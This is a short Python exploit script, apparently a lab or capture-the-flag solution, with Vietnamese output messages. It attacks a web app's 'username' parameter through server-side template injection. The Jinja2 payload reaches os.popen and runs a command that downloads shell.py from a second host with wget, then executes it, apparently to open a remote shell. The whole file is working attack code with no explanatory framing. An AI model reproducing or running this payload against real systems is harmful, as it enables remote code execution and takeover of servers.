import requests

host = "http://192.168.0.129:9001/welcome?username="
proxy = {'http': 'http://127.0.0.1:8080'}


command = "wget http://172.26.208.130:1234/shell.py; python ./shell.py; echo \"đã thực hiện\""

payload = f" cycler.__init__.__globals__.os.popen('{command}').read()"

url = host + '{{' + payload + '}}'
response = requests.get(url, proxies=proxy)

if response.status_code == 200:
    print("Kết quả trả về từ máy chủ:")
    print(response.text)
else:
    print(f"Lỗi: {response.status_code}")

